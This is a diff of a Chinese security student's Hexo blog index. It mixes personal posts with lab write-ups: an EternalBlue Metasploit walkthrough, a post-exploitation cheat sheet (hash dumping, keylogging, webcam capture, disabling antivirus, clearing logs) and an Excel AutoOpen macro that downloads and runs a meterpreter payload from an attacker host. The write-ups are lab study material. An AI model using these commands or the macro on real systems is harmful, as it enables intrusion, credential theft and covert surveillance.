-              <div class="tag link"><a class="link-card" title="菜鸟渗透日记24---DC-4靶机打靶过程详解" href="https://blog.csdn.net/leesir98/article/details/101620077"><div class="left"><img src="https://img.anineg.space/csdn.png"></div><div class="right"><p class="text">菜鸟渗透日记24---DC-4靶机打靶过程详解</p><p class="url">https://blog.csdn.net/leesir98/article/details/101620077</p></div></a></div><div class="tag link"><a class="link-card" title="DC-4靶机渗透指南（渗透测试详细操作）" href="https://blog.csdn.net/weixin_45671944/article/details/121747512"><div class="left"><img src="https://img.anineg.space/csdn.png"></div><div class="right"><p class="text">DC-4靶机渗透指南（渗透测试详细操作）</p><p class="url">https://blog.csdn.net/weixin_45671944/article/details/121747512</p></div></a></div><div class="tag link"><a class="link-card" title="【vulnhub】---DC-4靶机" href="https://blog.csdn.net/qq_43168364/article/details/106626917"><div class="left"><img src="https://img.anineg.space/csdn.png"></div><div class="right"><p class="text">【vulnhub】---DC-4靶机</p><p class="url">https://blog.csdn.net/qq_43168364/article/details/106626917</p></div></a></div>
-              </div>
-            </details>
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>靶机</tag>
-        <tag>渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>永恒之蓝漏洞复现</title>
-    <url>/2022/04/21/eternalblue/</url>
-    <content><![CDATA[<h1>漏洞描述：</h1>
-<p>Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
-<h1>影响版本：</h1>
-<p>目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
-<h1>复现环境：</h1>
-<p>攻击机：Linux Kali （192.168.8.242）</p>
-<p>靶机：Windows7 x64 （192.168.8.172）</p>
-<h1>复现过程：</h1>
-<h2 id="主机发现">主机发现</h2>
-<p>用nmap探测本网段存活主机 <code>nmap 192.168.8.17</code></p>
-<p><img src="https://img.anineg.space/1.png" alt="1"></p>
-<p>探测到存活主机ip，并探测到开放445端口，而永恒之蓝利用的就是445端口的smb服务，操作系统溢出漏洞。</p>
-<h2 id="进入MSF框架">进入MSF框架</h2>
-<p>执行<code>msfconsole</code></p>
-<p><img src="https://img.anineg.space/2.png" alt="2"></p>
-<p>ms17-010代码 msf6 &gt; <code>search ms17_010</code></p>
-<p><img src="https://img.anineg.space/3.png" alt="3"></p>
-<p>在这里可以看到两个工具，其中auxiliary/scanner/smb/smb_ms17_010是永恒之蓝扫描模块,探测主机是否存在MS17_010漏洞，exploit/windows/smb/ms17_010_eternalblue是永恒之蓝攻击代码，前者扫描漏洞，后者进行攻击。</p>
-<h2 id="使用ms17-010扫描模块">使用ms17-010扫描模块</h2>
-<p>msf6 &gt; <code>use auxiliary/scanner/smb/smb_ms17_010</code></p>
-<p>查看模块需要配置的参数  <code>show options  </code></p>
-<p><img src="https://img.anineg.space/4.png" alt="4"></p>
-<p>在Required一栏中显示yes的需要填写Current Setting项</p>
-<p>如 <code>set rhosts 192.168.8.172</code></p>
-<p>执行扫描 <code>run</code></p>
-<p><img src="https://img.anineg.space/5.png" alt="5"></p>
-<p>显示可能存有永恒之蓝漏洞。</p>
-<h2 id="使用ms17-010攻击模块">使用ms17-010攻击模块</h2>
-<p>msf6 &gt; <code>use exploit/windows/smb/ms17_010_eternalblue</code></p>
-<p>查看模块需要配置的参数  <code>show options  </code></p>
-<p><img src="https://img.anineg.space/6.png" alt="6"></p>
-<p>同理，设置目标IP ：<code>set rhosts 192.168.8.172</code></p>
-<p>设置用于接收从目标机弹回来的shell：<code>set  LHOST 192.168.1.11</code></p>
-<p>执行攻击 <code>run</code></p>
-<p><img src="https://img.anineg.space/7.png" alt="7"></p>
-<center>攻击成功！</center>
-<hr>
-<h2 id="后渗透阶段">后渗透阶段</h2>
-<p>使用<code>shell</code>可以进入被攻击机的Windows shell，但会有乱码。使用<code>chcp 65001</code>，改变代码页（65001为UTF-8的代码页）即恢复正常。</p>
-<p><img src="https://img.anineg.space/8.png" alt="8"></p>
-<p>使用<code>screenshot</code>进行截屏</p>
-<p><img src="https://img.anineg.space/9.png" alt="9"></p>
-<p>想从目标主机shell退出到 meterpreter ，输入：<code>exit</code></p>
-<p>要想从 meterpreter 退出到MSF框架，输入：<code>background</code></p>
-<h2 id="更多操作">更多操作</h2>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sysinfo             #查看目标主机系统信息</span><br><span class="line">run scraper         #查看目标主机详细信息</span><br><span class="line">run hashdump        #导出密码的哈希</span><br><span class="line">load kiwi           #加载</span><br><span class="line">ps                  #查看目标主机进程信息</span><br><span class="line">pwd                 #查看目标当前目录(windows)</span><br><span class="line">getlwd              #查看目标当前目录(Linux)</span><br><span class="line">search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件</span><br><span class="line">download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下</span><br><span class="line">upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下getpid              #查看当前Meterpreter Shell的进程</span><br><span class="line">PIDmigrate 1384     #将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span><br><span class="line">idletime            #查看主机运行时间</span><br><span class="line">getuid              #查看获取的当前权限</span><br><span class="line">getsystem           #提权</span><br><span class="line">run  killav         #关闭杀毒软件</span><br><span class="line">screenshot          #截图</span><br><span class="line">webcam_list         #查看目标主机的摄像头</span><br><span class="line">webcam_snap         #拍照</span><br><span class="line">webcam_stream       #开视频</span><br><span class="line">execute  参数  -f 可执行文件   #执行可执行程序</span><br><span class="line">run getgui -u hack -p 123    #创建hack用户，密码为123</span><br><span class="line">run getgui -e                #开启远程桌面</span><br><span class="line">keyscan_start                #开启键盘记录功能</span><br><span class="line">keyscan_dump                 #显示捕捉到的键盘记录信息</span><br><span class="line">keyscan_stop                 #停止键盘记录功能</span><br><span class="line">uictl  disable  keyboard     #禁止目标使用键盘</span><br><span class="line">uictl  enable   keyboard     #允许目标使用键盘</span><br><span class="line">uictl  disable  mouse        #禁止目标使用鼠标</span><br><span class="line">uictl  enable   mouse        #允许目标使用鼠标</span><br><span class="line">load                         #使用扩展库</span><br><span class="line">run				             #使用扩展库</span><br><span class="line">run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接</span><br><span class="line">                                   192.168.27的4444端口，缺点是容易被杀毒软件查杀</span><br><span class="line">portfwd add -l 3389 -r 192.168.11.13 -p 3389     #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址</span><br><span class="line">clearev                       #清除日志</span><br></pre></td></tr></tbody></table></figure>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">run post/windows/manage/migrate                  #自动进程迁移     </span><br><span class="line">run post/windows/gather/checkvm                  #查看目标主机是否运行在虚拟机上     </span><br><span class="line">run post/windows/manage/killav                   #关闭杀毒软件     </span><br><span class="line">run post/windows/manage/enable_rdp               #开启远程桌面服务     </span><br><span class="line">run post/windows/manage/autoroute                #查看路由信息     </span><br><span class="line">run post/windows/gather/enum_logged_on_users     #列举当前登录的用户     </span><br><span class="line">run post/windows/gather/enum_applications        #列举应用程序     </span><br><span class="line">run windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码     </span><br><span class="line">run windows/gather/smart_hashdump                #dump出所有用户的hash</span><br></pre></td></tr></tbody></table></figure>
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>靶机</tag>
-        <tag>渗透</tag>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hexo操作 &amp; Markdown语法</title>
     <url>/2022/01/13/hexo/</url>
     <content><![CDATA[<h1>发布文章</h1>
@@ -1041,23 +1041,6 @@ hexo clean            # 清除缓存和已生成的静态文件</p>
       </tags>
   </entry>
   <entry>
-    <title>某神奇社团的招新视频~</title>
-    <url>/2022/07/29/ladybug/</url>
-    <content><![CDATA[<div class="tip "><p>Tips：如有背景音乐自动播放，可以在左下角弹窗内关闭。</p>
-</div>
-<div align="center" class="aspect-ratio">
-    <iframe src="https://player.bilibili.com/player.html?aid=216487398&amp;&amp;page=1&amp;as_wide=1&amp;high_quality=1&amp;danmaku=0" scrolling="no" border="0" frameborder="no" framespacing="0" high_quality="1" danmaku="1" allowfullscreen="true"> 
-    </iframe>
-</div>
-]]></content>
-      <categories>
-        <category>视频</category>
-      </categories>
-      <tags>
-        <tag>bilibili</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2022/9/10，来自广西桂林</title>
     <url>/2022/09/10/letter1/</url>
     <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
@@ -1108,7 +1091,7 @@ hexo clean            # 清除缓存和已生成的静态文件</p>
 <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">cd /var/www/html</span><br><span class="line"></span><br><span class="line">msfconsole   </span><br><span class="line"></span><br><span class="line">use windows/x64/meterpreter_reverse_tcp</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.80.128 lport=4444 -f exe -o nc.exe</span><br></pre></td></tr></tbody></table></figure>
 <p>现在在<code>/var/www/html</code>路径下有<code>nc.exe</code>文件，我们需要它能够在Windows上被下载，所以我们启动web服务：</p>
 <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">systemctl start apache2.service</span><br></pre></td></tr></tbody></table></figure>
-<p>如果此时在Windows浏览器中打开：<a href="http://192.168.80.128/nc.exe%EF%BC%8C%E6%96%87%E4%BB%B6%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%A2%AB%E4%B8%8B%E8%BD%BD%E4%BA%86%E3%80%82">http://192.168.80.128/nc.exe，文件就可以被下载了。</a></p>
+<p>如果此时在Windows浏览器中打开：<code>http://192.168.80.128/nc.exe</code> ，文件就可以被下载了。</p>
 <p>回到Excel中，修改代码如下：</p>
 <p>原理同上，就是使用<code>curl</code>帮我们下载文件，然后在cmd中直接运行。</p>
 <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Sub AutoOpen()</span><br><span class="line">    Downloadandopen</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub Downloadandopen()</span><br><span class="line">    Dim curlPath As String</span><br><span class="line">    Dim fileURL As String</span><br><span class="line">    Dim downloadedFilePath As String</span><br><span class="line">    Dim command As String</span><br><span class="line">    </span><br><span class="line">    curlPath = "C:\Windows\System32\curl.exe"</span><br><span class="line">    fileURL = "http://192.168.80.128/nc.exe"</span><br><span class="line">    downloadedFilePath = "C:\Users\Administrator\Desktop\nc.exe"</span><br><span class="line">    </span><br><span class="line">    command = curlPath &amp; " -o " &amp; downloadedFilePath &amp; " " &amp; fileURL</span><br><span class="line">    Call Shell(command, vbNormalFocus)</span><br><span class="line"></span><br><span class="line">    Call Shell(downloadedFilePath, vbNormalFocus)</span><br><span class="line">End Sub</span><br></pre></td></tr></tbody></table></figure>
@@ -1127,6 +1110,23 @@ hexo clean            # 清除缓存和已生成的静态文件</p>
         <tag>靶机</tag>
         <tag>渗透</tag>
         <tag>分享会</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>某神奇社团的招新视频~</title>
+    <url>/2022/07/29/ladybug/</url>
+    <content><![CDATA[<div class="tip "><p>Tips：如有背景音乐自动播放，可以在左下角弹窗内关闭。</p>
+</div>
+<div align="center" class="aspect-ratio">
+    <iframe src="https://player.bilibili.com/player.html?aid=216487398&amp;&amp;page=1&amp;as_wide=1&amp;high_quality=1&amp;danmaku=0" scrolling="no" border="0" frameborder="no" framespacing="0" high_quality="1" danmaku="1" allowfullscreen="true"> 
+    </iframe>
+</div>
+]]></content>
+      <categories>
+        <category>视频</category>
+      </categories>
+      <tags>
+        <tag>bilibili</tag>
       </tags>
   </entry>
   <entry>
@@ -1283,6 +1283,23 @@ hexo clean            # 清除缓存和已生成的静态文件</p>
       </tags>
   </entry>
   <entry>
+    <title>文件上传漏洞</title>
+    <url>/2022/03/25/upload/</url>
+    <content><![CDATA[<h1>什么是文件上传漏洞</h1>
+<p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p>
+<h1>前端JS过滤绕过</h1>
+<h1>文件名过滤绕过</h1>
+<h1>Content-Type过滤绕过</h1>
+<h1>文件头过滤绕过</h1>
+<h1>.htaccess文件上传</h1>
+<h1>文件截断上传</h1>
+<h1>竞争条件文件上传</h1>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+  </entry>
+  <entry>
     <title>使用Vercel+Github搭建个人博客</title>
     <url>/2022/02/15/vercel/</url>
     <content><![CDATA[<h1>前言</h1>
@@ -1324,23 +1341,6 @@ hexo clean            # 清除缓存和已生成的静态文件</p>
       </tags>
   </entry>
   <entry>
-    <title>文件上传漏洞</title>
-    <url>/2022/03/25/upload/</url>
-    <content><![CDATA[<h1>什么是文件上传漏洞</h1>
-<p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p>
-<h1>前端JS过滤绕过</h1>
-<h1>文件名过滤绕过</h1>
-<h1>Content-Type过滤绕过</h1>
-<h1>文件头过滤绕过</h1>
-<h1>.htaccess文件上传</h1>
-<h1>文件截断上传</h1>
-<h1>竞争条件文件上传</h1>
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-  </entry>
-  <entry>
     <title>《拒绝校园贷》——大学生心理微电影</title>
     <url>/2022/05/01/weidianying/</url>
     <content><![CDATA[<div class="tip "><p>Tips：如有背景音乐自动播放，可以在左下角弹窗内关闭。</p>
@@ -1356,6 +1356,25 @@ hexo clean            # 清除缓存和已生成的静态文件</p>
       <tags>
         <tag>bilibili</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>《我不是药神》</title>
+    <url>/2022/03/17/wobushiyaoshen/</url>
+    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="666d2179323feb5ec551598dfa620f9d33b63bb1b19f3500446823dea8a9a014">79a8510ad980b24d8ff0ffe9bafb69aa31e2611f27017824642b1b97f26821030d5768d3bab397a2eef0bc9bef1e7ef61ce60a3f5f9301034e0f53e08f8216354d3f8bace8b457c054647f31aaf51152513038b6a2cff455092a768e640b714c33c96045a0b45cc48e682558aa568125d35d6434a3a51e9aed2088e1dde1c9f8f1783456b024c4b18f969688488b8e28bcd797fdd03af9079fd90a6aafb5667f8bccf824571670406f21c45ccb5cc1e47fdbd44b5d7948120df03b74e2d9c9453e3741d3ee454890670de4fdf917e8d72f32f924e799aebb3825fd0c8cc2c150740b19eb4ec53bc65fe929776e7f02622eb1c82d67baa3ed71d5bd4f4c3e067a8aedec73189c14bd616a510346983b14d83142b5759903890555356bdf4e71dd9f143a331c91587c1ef7abebca3fdcc7fb240f7ab6834375362c16e3e10163062d498f81e12b0faa815242b25ecb4df22429266042453aadae9c2a857a55ddf8a62731f6e2932bd22698916064fd08d06a841534b0866d7728247977b22bf205b5b94ad809f7249228f17d880f727967c8a0bd7062727e68f77227ffdafa2558714cb22db74c3850bd99f97c3119a065a03e56b43d56ddc82ba8d02949bd16c71599b673a3cf0e3a7e0c39c7be0184b9f895f5a4daab98ecacc17b6345c7ed805d8137abcb04c29026e95853ef609bef9b1a5169c35b027ce46de901efc555b834c439e78dd9276412cc5b02eadef701fd5db3a62c714bb502eed6645121a64a7d45b3d4164874b5d44defc352c5dc935400fb1966ce54395a4fc24138a2614514d4a94c5443ea358934abc666c829721d9ea38e891a1da25542d5deaeafe55866416a6763fa28ff600fba9a115cc8373ea8daec78cd431dbe847496276e4f4af064e96ab590fc7ba69f044e2573077d9b680ceca7a8004a5e47230f6d04cd7c07280cefbd1b4a48e7ea911909bcc59789c33cf5f9d7abf3a3bc154e354146bc80a419dfcbfccee7ed342f3b2856b465575cf8c266b85d40ef9fed7a2505abc6659643313b363824c2310e8fed8f633b5ba21342576d2be25dddf61ac2c66d52a81eb83f913a17e007d91f38f2d3c9e46c95aa795ee4bbb0f9e8c83db338c05d5c332be29fe250d6c807ab1f4be56df0bb046b92ffb469230ff66696f803085fd9c355a5243984577577220a27e84f41a5e4a81000e65e289513f914cdff9d5e2cb8ee57e71c62cffc36df1b8c0f01e1433ebf9431bea3727ad9cabc537b4ea5cbfd6faee2161f6e6f79cbc06da83fb80971d09703e617af93b01bc8333ef109eff4d198c34a22a45184c988b60ccbcb5a47e9144d1d1c2cf862f7602754eafb1218cfa6980e3de4905dbb03c5e63b7249aaebe28aefde6e51a37897eda29f1c0bef37da797ed2afa710e5d2714cc8258604908588c95b6bf8e3cc1585180fb57e58bd1808d9a5f05abc5f28af1af791018c407d8db26c32f07e60d45532d09343da936078f4e04d2515fbc63b5f1d53bff4cd6f27e81435d0a821b69e7b8914816af1c397edecaf9e3930e56e1f1e632ce517572c73ce64b70f26b63f921e0b6d69788acb054339a743df82e76fafb585f4f7966bb33a2501df5b02831c00d6f49381de41f6bc78632a055b37bb86e2f9bda1319cfc76f8cf95978a2af6cc33176588562f4d2139b16d0ed18226af8f692435ded43069cebd2b0e6654350c06f79bd4ad5520da3ce1a150e7fa0bd950cc63ada79b5a2f4f5db9c270680adf27499e1ad8cee50613b1a06e8d1b86472e11c3ad526ccc6a485722b27e1f1fa022c18e91a4b6ce0ac76da77b496dd9b016dc58a8a29f0045b524ba79b1d010c682ef061121492638b323332a2170e839c241e3206fa33d3210dc55b34ae4926dd22f70419cb4720b6545874b7846c23b60ac5279f83d7cc57dd7a7ed10e8ccb24eb7b8587efd2e3d13ab7456a0813388ecfe80a1936f5b91e3c277e60c7934fc3fe61676cfaaeb25260df3aa2c28f7fd782772212720434ff5e6ece2e6161db0a24785fe469220578561b32863b0e0c9506facf9b4c0205083a9aa382df58acdfafa71de0a84a2d58f8efa637d54e874f23963d088b4b5f59d6a07546fe030a2bc7da9e1da4d6d4fcd4d2cc315cbfe408a78dc82d0b78ae3ca25188b447aa0e8a62d3903b7feaf1421f7191d3a98f6849f8608fe24bacf734c01e949707e99caee6748f537f1d13f57535f75d5cb7a2fe8b5abf7ad210842ecee55ea7d45ed8f8ca7633d8136f93194c9247993e636766cb8e0f003a7f7fc922820acb16d7fbc7e55b776ccd30dfe05fbe1d54a6bf6e283f8556eff4945327b2a8f0afb8d99f4f35327a6fbbfd630db9e9ed20ced7cb0bf2593622e4906b7f6af5a8646037c1beaece1818a561dc16141f784bc14186ff66fce5aba30ccdcef5982cb6ae18d8f00b54aa0b4dee315c95dffae347bd296bb5b5c23b7356b24880aee37bbc9bec86eefaa8734638fb146475d222a13bb3b14b9dfd05da8026bc0e462758685fdacec1e17768cefc168b759abf909aab856e8df0f8368671dcb96401e9c30c8a8456c554a8bce3cf301769b6e5c92923da34b0d8a04f14d2eb0f5bc4372afd50586a25b9f50c1cfabf43dc83a216cb7c47cf9445abb3b30bfa2c25a586381726449e29e206c2468b6ca68cf05d88b1b881e005385cbcd8c9f6d4e8bc0ac0378b898b22004d2576ee1b50f62e2c1f35491db5cf51b8a33db23eb44d4890491222e79a92395e9494a2018a9a9dec978d8ba7fd4be5b06a2bda49ab5c63cade4bd520a22f1482b06e0b1cd213f28a24a29f102ee527a65cba5e58c550fa94701f7d2f7a370bc28ea38318fa1c40c630139e455d7d8d4293945f6703c304468ec9db040c062012c88abef9ea414e6cbc03f528587e38fd599f728878dead5ba09eb046b1043c32ab65e110007e81310c7c70023e018a02551c82776218280f053183222681cbfa52b649fdf16bccb1b0ad52a2b2466c13e5d74c757b6279456e095d15700c454ca1d80d4e53610caee23bc6a0c2e1ea0500d9b657c52da52242cbeec41c54b6326dc0a27ff9fd90890e0052af497016d6dc7db63a7faf124eb412b3e2ec8dadc22ebcecd37fd5c28eb1dbc3e6e38ba3d1c6b00d7c5f12c92934f7caba5fdf68222eaf589506112a82c7a0702b71ef42209f15d358a72cc96e0b01c5f7e3d2b5c4a642ba0cdde80d5514245873df84467a6c36ee889b821d1981dbe802823e2e6ba059de91f3f1df3546aa5aa3756e678ec41670cac78bccb7cf09206a0d937c1d2e4ccc03bf63e9141dde155606eb7241527138dbb477d0ca3f9ec7a9d17cd09def2185a4d8ef1323031c70ab269387f106bf9cf653eceaa5f3d5296db70d0901e7aa2a3d68fc612eb365c75656c00941b55d3a4d45455fac6059002f898a21c7f4b460532dda2bf8eb03e8c16f720e29f1074116a78301f9bbd2a43d274e39f6898ba10758bcbffcee3f661ca3e3c227a6c9b99ddec81437cbdb4187b79ba47495358d45e32ac793ef0953e4dd7e7174eaea19d0eb4fdc4b3c6c9ffe9ce3c1661f91e4ede119a9715f00f9f12e568fab689ab8feb561cbdf0181da05dd11fd5cea4819e6d5b6738ec24cb1d717769e6608aea0a7bc523aef9928ce6a02c03ce766f322b79d477e028e7e8b2a77f7c701f4d839ac7a8d95408461a74cdb4047288ef33148a4355c2629821241bd91c95aa8baa7ced9e6a57a3899fd0d359a2b260b0d83777b8718d0035184c61ebafaa11143675da1cd67890351d5862011c35429c4bf7927548b2f36b1efccad7ad399aac8332164b2ad901a6e9663890449eecab58d147acb6a06d676da278b3a523a951b6b85b2b3f24306dd3b6def987c78e67ecda4f33212fec193d611267749cdde871fc84d059344ecde839338706eafcbf31f640f889c283153c55c1ad7c40055a9f4943edc4a98046d5e6655d329d2969f2d5b7edeb4bacf67c64e4706dbacb3da84d18e25f0552dc268ba34bd23e96f22a1371b58f49fac0bb5770832a82ebb95c9cc762a26714ef45a1805897ea72d44b24573ac89d8cc7e602610d1edc44b0cc1e5d811bca3fba5c6b74d34107fa51fe4c5bba03fda1d7c588425fac6f927c4185b98d76b203a793de4d9168ec2e63d218f968b0e65926ac89c35204eca2801fae023794fa407550ef38d46e81ecfae990ad3adb30d658879445f88b494a4f53ac269c9775ac16340f30e4c15efc46de0fa21c217b8b8168bbb0a1b0aa7f50f0f33a516cfac03f1cb790be05002a11db7f47412ca20cee8df52d9821251441ddaef62db46d217eb37f48d4e5db7c2e1f797003a60419cb4c555e80974a4419c95c368f64d8ae8f5156337900bbd258ada5fffec1914d6aa6aa05cf9ef3248177e24f1568c14d032a5023141e84ef716c6488791b3a90def98f561fde7b9a7908f3bcc3e53bf6b436d48c73d834f48149e2b9ac4cdd24da95354f41a6eed783034e739aef8b8286c49970620d636e6d90c72ac28357a4a780002ac5e96e4abce44577b9533e40095c93cf3cdd566717124ba5a8c84ac5c08f18b8916034dcfed0db6269a74df9282dadec46d0bbe2dde8708ff20db447f04befa705d2e48eb1462d0d82b3dd68f958c15d40a17b1b9cac98d2b3767638551dec3531729edf90b22973fbb15d133d162a2760de9ae1a401563295a85b87c7f24f5ce7ccc94dcfea1b512007ff90fb7e7d6a5ffe12dbd94aa4c8b40237471f53203b5c6112f23bd41de769e514285c29156248538866eacaaa30bb86469e0e3fd56da5d86e097f6704ee54297ce6046e80ccf0323cf450cdaade7e472f6a2ee24af6f974d9b11cb088f35a50f3bab88d4ab64b8f994a9f3d70ca56d49b0024a7c6be799c1a9dfc8e71627530f52ff4d09d5707a75fa3cb1eb4d2cd4ff2a4856c4e06ba798b3f84008e03867d486f314c234bfec92463cc842b822fada1f485d56efa01d514e8806272d455c36fcd87414628473dbaf582ee9d4cd376ef759f30c885679efa1bf54c299db82f7bd860bc2e83e7227f3363a6eabe4449d31249c5fef01e0bc10e703ef20298140b5dd39a2a30d954d5a20ebaa9114af580d8cfc6fba1909db719b5bfe13f83ad0c6d20d7ef94ed755dab8e4550ff7d3237ffb707af42f11256f59890ab5ad2bf6cfa57e4979fb3db0564b13f12fc26785d96e0b138afd14d0b58123287270e6787768adbdd9938adfcb00e4d6f8b49d26d377b449fea51de5d425de1f774901522f235f3e028cc7a73a7d4d09c36524fe47945503073c5bc0477b86a46160a902b0696f4582817e01e0e70e4f622e92d90ca4a4123f9cf48dcfb91d6d2fd7afa940d35f5326d618d1ddb99620dc0bb9823e029028de0ff7d5704ce2a7085419ebb02d3793499d092b207242a1ca674ac2f3974e1d579c7c7261c6972007df6839eba1aabb12055107877912d62a7f7627002b700e154569853862aa6bd43d4f5478be4718fb8612ce90b48692ee1c29ef569ab6b08f4d81905fb8a82415a348b904087cefcab8a880141c33a4320f4653789ac38c55c05628f56eabc5f04db8e64a70488707ddbf5f6c8e0ac9f7ed9ee0b818b6e762b1b1c9b302fb651cf1ef7a64d6bf73937efbe4736372a74175f9845f5922b9e4d04c2186a5ea03dff9cb85907b8c2cc19f55a1253d18536dc779578c84fbd568d55ba9658c2ae6d5f6c590aea67f2c247f3c6a470f4395454bd69bfd8ef83a537b08286ac631e15585cdfbc4eb19809edc5651f16b09dab9556c00ad99e3a26393bb542db8786ceddca2687ae321ed721854c1ebb23567f5824b25fcab6cc4e4e48cbb23e61d4e9e29be4cc6a93dd665103553e4dd304005045635c044e8803617a88a19f14be8f7d420fbe0feea1b7f43ecd721d7b9e7779f4fc434bed7b03cd9119bfe79e06a1698d0644a5e5ae44cf3e1023f352cef7d4e5f5330429c8241d32ee22130c9ee1e3715a3e5d58f3950c9f379cef0d0d69c9837688914334ef892346a0f58b132f628c4df86507af6bec6547e810bfdcb98c98e4f211f0ceb3a6f094b33d4d644b6623b39dc06d82a2effe78d2957a43f4cdec02c145f7c3b97ec870c6dc228e86b45db46e26c2590e59d64d14d27a85be8221a87da0b4f0273952a214db0333112fd7b5242954e89f1cfbb1aff46786e87e1bd7e3d185283bd103da9e473d559784fbafc3034ec46b872e5980fe4bc19344628d89859479a000a23775cb041aade2da0f25370c70bc449629a608f2a251d1d0751c7b3be73854ff</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-up">
+      <input class="hbe hbe-input-field hbe-input-field-up" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-up" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-up">加密文章，请输入密码</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      <categories>
+        <category>随手记</category>
+      </categories>
   </entry>
   <entry>
     <title>桥接模式、NAT模式和仅主机模式</title>
@@ -1389,6 +1408,42 @@ hexo clean            # 清除缓存和已生成的静态文件</p>
       </categories>
       <tags>
         <tag>虚拟机</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>搭建几乎0成本的个人网盘！</title>
+    <url>/2022/11/20/yunpan/</url>
+    <content><![CDATA[<h1>Onedrive-Vercel-Index</h1>
+<p>最近在网上发现了一个挺有意思的项目<a href="https://github.com/spencerwooo/onedrive-vercel-index/">onedrive-vercel-index</a>，它可以在Vercel上部署一个属于你自己的网盘。那么相比于百度网盘，你对他有着很高的控制权，<s>并不需要担心你的资源会被河蟹</s>。那么至于网速，Onedrive给的带宽不太稳定，有时可以跑到满速，有时只有3MB/s，但怎么说也比某度网盘良心多了。</p>
+<p>但这个网盘最大的缺点就在于空间上。现在注册Onedrive默认是5GB的空间，这显然不够用。但是也并非没有办法，我们在某宝上花个大概三块钱就可以把一个账号的空间永久提升至15GB。当然，如果你是购买了office365的话，那你就可以拿到1T的容量，就不需要担心什么容量的问题。网上还有一种教育版的，容量为1-5T，但是我不建议大家使用，因为这个账号的管理员可以看到你的文件，大家应该都知道数据的重要性，所以不要贪便宜使用这种。</p>
+<p>最后一个问题，Vercel给你提供默认的域名大概率由于某些原因无法访问，所以你还需要拥有一个自己的域名，并把它解析到Vercel上。购买一个域名其实并不贵，如果是新用户就会更便宜了。例如<code>.space</code> <code>.top</code> <code>.asia</code>这类，新用户只需要个位数就能拿下一年，甚至在搞活动的时候一块钱就能拿下一个<code>.cn</code>域名。一个域名可以解析到很多服务器，对于已经有域名的同学来说，这个成本直接忽略不计。</p>
+<p>因此，与我个人而言，搭建这个基本上是不需要成本的，只是需要花费那么一丢丢的时间。但是对于刚上手的同学们来说，需要那么一点点的开销，但<s>相对于某度会员或者是他们卖的那种“24小时高速下载券”来说</s>并不多。</p>
+<h1>搭建网盘</h1>
+<h2 id="准备工作">准备工作</h2>
+<ul>
+<li>一台能上网的电脑</li>
+<li>一个GitHub账号</li>
+<li>一个Vercel账号</li>
+<li>一个Onedrive账号</li>
+</ul>
+<p>打开 onedrive-vercel-index 的<a href="https://github.com/spencerwooo/onedrive-vercel-index/">项目地址</a>并 <a href="https://github.com/spencerwooo/onedrive-vercel-index/fork">Fork</a> 到自己的账号中。</p>
+<p>打开项目中的/config/site.config.js，这个就是你的网盘的配置文件了，按照提示进行修改。</p>
